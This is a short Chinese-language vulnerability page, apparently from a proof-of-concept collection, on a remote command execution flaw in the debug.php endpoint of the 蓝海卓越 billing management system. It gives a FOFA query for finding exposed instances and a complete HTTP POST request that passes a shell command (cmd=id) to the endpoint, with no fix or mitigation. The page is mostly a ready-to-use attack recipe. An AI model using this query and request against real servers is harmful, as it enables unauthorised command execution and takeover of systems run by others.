# 蓝海卓越 计费管理系统debug存在远程命令执行漏洞

# 一、漏洞简介
蓝海卓越 计费管理系debug存在远程命令执行漏洞，导致攻击者可以远程命令执行

# 二、影响版本
+ 蓝海卓越 计费管理系统

# 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征

![1716136162798-aa34ed6f-ea20-43f2-99a7-dba6a1e626c9.png](./img/v8vbMQIfX0kONNUn/1716136162798-aa34ed6f-ea20-43f2-99a7-dba6a1e626c9-099589.png)

# 四、漏洞复现
```plain
POST /debug.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 6
Connection: close
Cookie: PHPSESSID=6jvq6prlaoemtc00r7a876ntb4
Priority: u=1

cmd=id
```

![1716136252700-9872c760-028e-41b3-b57e-53c461873e34.png](./img/v8vbMQIfX0kONNUn/1716136252700-9872c760-028e-41b3-b57e-53c461873e34-607611.png)



> 更新: 2024-05-23 12:33:24  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uz5gelsecrff83dp>